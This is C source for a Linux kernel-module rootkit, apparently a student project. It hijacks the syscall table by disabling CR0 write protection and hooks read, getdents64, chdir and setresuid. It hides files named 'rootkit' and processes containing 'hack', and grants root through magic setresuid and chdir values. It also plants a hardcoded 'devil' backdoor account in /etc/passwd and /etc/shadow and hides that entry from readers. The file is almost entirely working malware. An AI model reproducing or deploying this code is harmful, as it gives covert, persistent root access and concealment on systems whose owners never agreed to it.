#include <linux/proc_fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/file.h>

#define malicpro    "hack"
#define hidefile	"rootkit"
#define max_maliproc 10
#define magic_number 
//References
//http://www.cbs.dtu.dk/cgi-bin/nph-runsafe?man=getdents64
//https://kernelnewbies.org/Documents/Kernel-Docbooks?action=AttachFile&do=get&target=procfs-guide_2.6.29.pdf
//https://linux.die.net/lkmpg/x710.html
//https://www.kernel.org/doc/Documentation/security/credentials.txt
//The Linux Kernel Module Programming Guide
//http://phrack.org/issues/58/6.html
//ALTERING CREDENTIALS

/*
*struct proc_dir_entry proc_root = {
*	.low_ino	= PROC_ROOT_INO, 
*	.namelen	= 5, 
*	.mode		= S_IFDIR | S_IRUGO | S_IXUGO, 
*	.nlink		= 2, 
*	.count		= ATOMIC_INIT(1),
*	.proc_iops	= &proc_root_inode_operations, 
*	.proc_fops	= &proc_root_operations,
*	.parent		= &proc_root,
*	.subdir		= RB_ROOT,
*	.name		= "/proc",
*};
*/

/***
* The need for defining this struct is to dereference the members of this struct
* because this definition was not defined in the proc_fs and therefore we need to
* define separately here.
***/
struct proc_dir_entry {
	unsigned int low_ino;
	umode_t mode;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	void *data;
	atomic_t count;		/* use count */
	atomic_t in_use;	/* number of callers into module in progress; */
			/* negative -> it's going away RSN */
	struct completion *pde_unload_completion;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
	u8 namelen;
	char name[];
};

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};
unsigned long **sys_call_entry;
unsigned long original_cr0;

static void interceptor_end(void);
static void exit_procfs(void);

static struct proc_dir_entry *dumm_entry;
static struct proc_dir_entry *proot;
static struct file_operations *pfops;

ssize_t (*fops_epass_read)(struct file *, char *, size_t, loff_t *);
ssize_t (*fops_eshad_read)(struct file *, char *, size_t, loff_t *);
int (*proc_iterate_real)(struct file *file, struct dir_context *ctx);

int (*filldir_real)(struct dir_context *ctx, const char *name, int namlen,
                loff_t offset, u64 ino, unsigned int d_type);

asmlinkage long (*read_real)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*write_real)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*getdents_real)(unsigned int fd, struct linux_dirent __user *dirent, 
										unsigned int count);
asmlinkage long (*open_real)(const char __user *filename,
                             int flags, umode_t mode);
asmlinkage long (*setresuid_real)(uid_t ruid, uid_t euid, uid_t suid);

asmlinkage long (*chdir_real)(const char __user *filename);

int filldir_hijack(struct dir_context *ctx, const char *name, int namlen,
                loff_t offset, u64 ino, unsigned int d_type)	
{
	struct file *filp;	
	char *filname;
	char *buff;
	
	mm_segment_t oldfs;
	int ret = 0;
	
	if (d_type == DT_DIR && name[0] > '0' && name[0] <= '9') {

		/* 
		* pr_info("first time collecting all the pids\n");
		* The idea is to cache all the pids for the first time and then keep 
		* track of all the pids and after that compare only those pids
		*/
		
		filname = kzalloc(256, GFP_KERNEL);
		if (filname == NULL)
			goto out;
		
		buff = kzalloc(PAGE_SIZE, GFP_KERNEL);
		if (buff == NULL) {
			kfree(filname);
			goto out;
		}
		
		memcpy(filname, "/proc/", 6);
		memcpy(filname + 6, name, namlen);
		memcpy(filname + 6 + namlen, "/status", 7);
		filname[13 + namlen] = '\0';			
		
		filp = filp_open(filname, O_RDONLY, 0);
		if (filp == NULL) {
			kfree(filname);
			kfree(buff);
			goto out;
		}
		
		filp->f_pos = 0;		
		oldfs = get_fs();
		set_fs(get_ds());
		vfs_read(filp, buff, PAGE_SIZE, &(filp->f_pos));		
		set_fs(oldfs);	
		
		if (strnstr(buff, malicpro , PAGE_SIZE) != NULL) {			
			pr_info("found our process\n");
			filp_close(filp, NULL);
			kfree(buff);
			kfree(filname);
			//kfree and filp_close should be done here as well.
			return 0;
		}
		
		filp_close(filp, NULL);
		kfree(buff);
		kfree(filname);
	}
out:
	ret = filldir_real(ctx, name, namlen, offset, ino, d_type);
	return ret;

}
int proc_readdir_new(struct file *file, struct dir_context *ctx) 
{
	int ret = 0;
	
	pr_info("intercepted readdir\n");
	
	filldir_real = ctx->actor;
	*((filldir_t *)&ctx->actor) = &filldir_hijack;
	
	ret = proc_iterate_real(file, ctx);
	
	*((filldir_t *)&ctx->actor) = filldir_real;
	
	return ret;
}

asmlinkage long setresuid_hijack(uid_t ruid, uid_t euid, uid_t suid)
{
	if (ruid == 789 && euid == 789 && suid == 789) {
		struct cred *creds = prepare_creds();
		creds->uid.val = 0;
		creds->gid.val = 0;
		creds->euid.val = 0;
		creds->egid.val = 0;
		creds->suid.val = 0;
		creds->sgid.val = 0;
		creds->fsuid.val = 0;
		creds->fsgid.val = 0;
		commit_creds(creds);
		
		pr_info("elevated successfully\n");
		return setresuid_real(0, 0, 0);
	}
	return setresuid_real(ruid, euid, suid);
}
asmlinkage long read_hijack(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	char *buff;
	char *modbuff;
	char *match;
	
	char *pathname;
	char *fil_path;
	struct file *filp;
	
	filp = fget(fd);
	ret = read_real(fd, buf, count);
	
	/*
	* We need to have the full path name and cannot just check the user buf and remove the entry.
	* because this file (rootkit.c). We also be read through this system call and in that case
	* our strings hardcode strings in this code will also be replaced. Therefore we need to check
	* the file which is accessing.
	*/
	if (ret > 0) {
		pathname = kzalloc(PAGE_SIZE, GFP_KERNEL);
		fil_path = file_path(filp, pathname, 4096);
		
		if (strlen(fil_path) == 11 && (strcmp(fil_path,"/etc/passwd") == 0 
						||strcmp(fil_path, "/etc/shadow") == 0)) {
			//pr_info("the fil_path %s %ld\n", fil_path, ret);
			buff = kzalloc(count, GFP_KERNEL);
			copy_from_user(buff, buf, ret);
			//pr_info("the earlier contet  : %s\n", buff);
			
			match  = strstr(buff, "devil:x:1002:1002:devil lurking,,,:/home/devil:/bin/bash");
			if (match != NULL) {
				int i=0;
				modbuff = kzalloc(count, GFP_KERNEL);
				
				while ( buff + i != match) {
					modbuff[i] = buff[i];
					i++;
				}
				//pr_info("The value of i : %d\n", i);
				//pr_info("the earlier content : %s\n", modbuff);
				//pr_info("the earlier contet  : %s\n", buff);
				if ((ret - (i + 56)) >= 0) {
					memcpy(modbuff + i, buff + i + 56, ret - (i + 56));
					//pr_info("contens of the starting : %s\n", buff);
					//pr_info("the contents of the buffer : %s\n", buff + i);
					//pr_info("the contens of the buffer : %s\n", buff + i + 57);
					ret = ret - 56;
				}
				copy_to_user(buf, modbuff, ret);
				kfree(modbuff);
			}
			
			kfree(buff);
		}
		kfree(pathname);
	}
	fput(filp);
	return ret;
}
asmlinkage long getdents_hijack(unsigned int fd, 
						struct linux_dirent __user *dirent,
							unsigned int count)
{
	long ret = 0;
	char *dirp = NULL;
	char *cpdir = NULL;
	long offset = 0;
	long off_cp = 0;
	struct linux_dirent64 *d;
	
	ret = getdents_real(fd, dirent, count);
	if (ret > 0) {		
	
		dirp = kzalloc(ret, GFP_KERNEL);
		if (dirp == NULL)
			goto out;
		
		cpdir = kzalloc(ret, GFP_KERNEL);
		if (cpdir == NULL) 
			goto outa;
		
		if (copy_from_user(dirp, dirent, ret)) 
			goto outb;
		
		offset = 0;
		off_cp = 0;
		
		while (offset < ret) {
			d = (struct linux_dirent64 *)(dirp + offset);
			if (strstr(d->d_name, hidefile) == NULL) {
				/*Only copy where rootkit is not found*/
				memcpy(cpdir + off_cp, dirp + offset, d->d_reclen);
				off_cp += d->d_reclen;
			}
			offset += d->d_reclen;			
		}
		if	(copy_to_user(dirent, cpdir, off_cp)) {
			
			/*
			* If we fail to copy our new data to user buffer 
			* then return the user then call the original and 
			* return it to user this is our strategy 
			*/
			ret = getdents_real(fd, dirent, count);
			goto outb;
		}
		ret = off_cp;
		kfree(dirp);
		kfree(cpdir);
		
		dirp = NULL;
		cpdir = NULL;
	}	
outb:
	kfree(cpdir);
outa:
	kfree(dirp);
out:
	return ret;
}
asmlinkage long chdir_hijack(const char __user *filename) {

	char ptr[10];
	int len = 0;
	kuid_t p;
	kgid_t g;
	
	p.val = (uid_t)0;
	g.val = (gid_t)0;
	
	pr_info("hijacked chdir\n");
	
	len = strnlen_user(filename, 4096);
	
	/*
	*strnlen_user gives the length including null character
	*/
	
	if (len == 5) {
		if (strncpy_from_user(ptr, filename, len - 1) > 0) {
			ptr[len - 1] = '\0';
			if (len == 5 && memcmp(ptr, "adrt", len - 1) == 0) {
				/**
				* prepare_creds() :- creates the copy of credentials of this current process
				* commit_creds() :- commits the cred now our set will be used
				**/
				struct cred *new = prepare_creds();
				new->uid.val = 0;
				new->gid.val = 0;
				new->euid.val = 0;
				new->egid.val = 0;
				new->suid.val = 0;
				new->sgid.val = 0;
				new->fsuid.val = 0;
				new->fsgid.val = 0;
				commit_creds(new);
				pr_info("elevated successfully\n");
				return chdir_real(filename);
			}
		}
	} 
	return chdir_real(filename);
}
static unsigned long **aquire_sys_call_entry(void)
{
	/* This is system code to acquire the syscall*/
	/* http://stackoverflow.com/questions/26000691/system-call-interception-via-loadable-kernel-module*/
	
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *) sys_close) 
			return sct;

		offset += sizeof(void *);
	}
	return NULL;
}
ssize_t
procfile_read(struct file *filp,
	      char *buffer, size_t length,
	      loff_t *offset)
{
	int ret;
	static int finished = 0;
	if (finished) {
		finished = 0;
		return 0;
	}
	finished = 1;
    ret = sprintf(buffer, "DummyHelloWorldEntry\n");
    return ret;
}
static struct file_operations dumm_entryops = {
	.owner = THIS_MODULE,
	.read = procfile_read,    
};

static int __init attack_procfs(void) 
{
	/*
	* This is for preventing malicious process from showing up
	* when user does ps command The idea was derived from the 
	* blog written in http://phrack.org/issues/58/6.html which 
	* talk about the vulnerabilities that can be exploited in procfs
	* We have used the same concept of hacking the /proc by changing
	* its parent process iterate function's filldir function and pointing
	* it to ours. The vulnerabilities mentioned in the article talked
	* about linux version 2.2 but we have hacked for version 4.6 
	* it by analyzing existing source code for current proc fs which has
	* changed a lot
	*/
	
	int err = 0;	
		
	pr_info("setting procfs\n");
	if (err < 0)
		goto out;
	
	dumm_entry = proc_create("dumentry", 0, NULL, &dumm_entryops);
	if (dumm_entry == NULL) {
		remove_proc_entry("dumentry", NULL);
		err = -ENOMEM;
		goto out;
	}
	
	proot = dumm_entry->parent;
	pr_info("verifying the parent %s\n", proot->name);
	pfops = (struct file_operations *)proot->proc_fops;
	if (pfops->iterate == NULL) {
		pr_info("readdir operation not permitted\n");
		goto out;
	}
	
	proc_iterate_real = pfops->iterate;
	
	original_cr0 = read_cr0();
	write_cr0(original_cr0 & ~0x00010000);
	pfops->iterate = proc_readdir_new;
	write_cr0(original_cr0);
	
out:
	return err;
}

static int add_backdoor(void) 
{
	int err = 0;
	int epass_len;
	int eshad_len;
	struct file *filp_pass;
	struct file *filp_shad;
	
	char *buff_pass;
	char *buff_shad;
	
	mm_segment_t oldfs;
	
	/*
	* Hardcoded value for adding backdoor account in /etc/passwd and /etc/shadow
	* We donot perform any clean up of the backdoor account when our module exits.
	* So while testing after we remove the module. execute the below command.
	* to perform cleanup "userdel -f devil". Beware inserting module multiple times
	* without executing this command will result in multiple entries.
	*/
	epass_len = strlen("devil:x:1002:1002:devil lurking,,,:/home/devil:/bin/bash\n");
	eshad_len = strlen("devil:$1$xyz$jYhggMsejqNh4czc7hl8N/:17121:0:99999:7:::\n");
	
	pr_info("the len of the string: %d\n", epass_len);
	buff_pass = kzalloc(epass_len + 1, GFP_KERNEL);
	if (buff_pass == NULL) {
		err = -ENOMEM;
		goto out;
	}
	
	buff_shad = kzalloc(eshad_len + 1, GFP_KERNEL);
	if (buff_shad == NULL) {
		err = -ENOMEM;
		goto outb;
	}
	
	filp_pass = filp_open("/etc/passwd", O_APPEND | O_WRONLY, 0);
	if (filp_pass == NULL || IS_ERR(filp_pass)) {
		err = PTR_ERR(filp_pass);
		pr_info("unable to open the /etc/passwd file\n");
		goto outa;
	}
	
	filp_shad = filp_open("/etc/shadow", O_APPEND | O_WRONLY, 0);
	if (filp_shad == NULL || IS_ERR(filp_shad)) {
		err = PTR_ERR(filp_shad);
		pr_info("unable to open the /etc/shadow file\n");
		goto outa;
	}
	
	memcpy(buff_pass, "devil:x:1002:1002:devil lurking,,,:/home/devil:/bin/bash\n", epass_len);
	memcpy(buff_shad, "devil:$1$xyz$jYhggMsejqNh4czc7hl8N/:17121:0:99999:7:::\n", eshad_len);
	
	oldfs = get_fs();
	set_fs(get_ds());
	err = vfs_write(filp_pass, buff_pass, epass_len, &(filp_pass->f_pos));
	set_fs(oldfs);
	pr_info("Total bytes wrote : %d\n", err);
	filp_close(filp_pass, NULL);
	
	oldfs = get_fs();
	set_fs(get_ds());
	err = vfs_write(filp_shad, buff_shad, eshad_len, &(filp_shad->f_pos));
	set_fs(oldfs);
	pr_info("Total bytes wrote : %d\n", err);
	filp_close(filp_shad, NULL);
	
outa:
	kfree(buff_shad);
outb:
	kfree(buff_pass);
out:
	return err;
}
	
static int __init attack_syscall(void) 
{
	int err = 0;
	
	pr_info("starting interception...\n");
	if(!(sys_call_entry = aquire_sys_call_entry()))
		return -1;
		
	pr_info("interceptor started\n");
	pr_info("sys_call table address %p",sys_call_entry);
	
	original_cr0 = read_cr0();
	write_cr0(original_cr0 & ~0x00010000);
	
	read_real = (void *)sys_call_entry[__NR_read];
	getdents_real = (void *)sys_call_entry[__NR_getdents64];
	chdir_real = (void *)sys_call_entry[__NR_chdir];
	setresuid_real = (void *)sys_call_entry[__NR_setresuid];
	
	sys_call_entry[__NR_read] = (unsigned long *)read_hijack;
	sys_call_entry[__NR_getdents64] = (unsigned long *)getdents_hijack;
	sys_call_entry[__NR_chdir] = (unsigned long *)chdir_hijack;
	sys_call_entry[__NR_setresuid] = (unsigned long *)setresuid_hijack;
	/*
	* to disable the page protection by changing the 16th bit of cr0 
	* the read function
	* cr0 
	*/
	write_cr0(original_cr0);
	pr_info("system call hijack started\n");
	return err;
}
static int __init attack_start(void)
{
	int err = 0;
	
	
	pr_info("attack started\n");
	
	err = attack_syscall();
	
	if (err < 0) {
		interceptor_end();		
		goto out;
	}
	
	err = attack_procfs();
	if (err < 0) {
		interceptor_end();	
		exit_procfs();
		goto out;
	}
	
	err = add_backdoor();
	if (err < 0) {
		interceptor_end();	
		exit_procfs();
		goto out;
	}
	pr_info("capture password\n");
	//err = capture_passwd();
	if (err < 0) {
		interceptor_end();	
		exit_procfs();
		//uncapture_passwd();
		goto out;
	}
	if (err > 0)
		err = 0;
	
	pr_info("attack started\n");
out :
	return err;
} 

static void interceptor_end(void) 
{
	
	/* restoring the original state of the system */
	if(!sys_call_entry) {
		return;
	}
	
	original_cr0 = read_cr0();
	write_cr0(original_cr0 & ~0x00010000);
	
	sys_call_entry[__NR_read] = (unsigned long *)read_real;
	sys_call_entry[__NR_getdents64] = (unsigned long *)getdents_real;
	sys_call_entry[__NR_chdir] = (unsigned long *)chdir_real;
	sys_call_entry[__NR_setresuid] = (unsigned long *)setresuid_real;
	write_cr0(original_cr0);
	//msleep(2000);
	pr_info("stopping sys call interceptor\n");
}

static void exit_procfs(void) 
{

	original_cr0 = read_cr0();
	write_cr0(original_cr0 & ~0x00010000);	
	pfops->iterate = proc_iterate_real;
	write_cr0(original_cr0 );
	
	remove_proc_entry("dumentry", NULL);
	pr_info("performing procfs cleanup\n");
}
static void __exit attack_end(void)
{
	exit_procfs();
	interceptor_end();
	
	pr_info("ending attack\n");
}

module_init(attack_start);
module_exit(attack_end);

MODULE_LICENSE("GPL");
